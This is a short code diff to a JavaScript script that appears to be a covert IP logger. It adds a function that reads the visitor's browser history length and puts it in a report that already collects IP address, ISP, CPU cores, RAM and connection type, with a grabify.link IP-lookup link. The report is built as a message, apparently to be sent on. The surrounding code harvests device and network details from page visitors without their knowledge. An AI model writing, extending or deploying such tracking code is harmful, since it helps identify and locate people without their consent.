@@ -224,6 +224,16 @@ function getDeviceMemory() {
 }
 
 
+	
+function getHistoryLength() {
+  try {
+    return window.history.length-1;
+  } catch (error) {
+    console.error("Error getting history length:", error);
+    return "N/A";
+  }
+}
+
 
 
 
@@ -289,6 +299,7 @@ const isp = await getISP(ip)
 
 const logicalCores = navigator.hardwareConcurrency;
 const ram = getDeviceMemory()
+const historyInfo = getHistoryLength();
 
 
 
@@ -323,6 +334,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Logical CPU Cores: ${logicalCores}
 - Internet Connection Type: ${connectionType}
 - RAM (available to browser): ${ram}
+- Tab history length: ${historyInfo}
 `;
 
 const msg = {
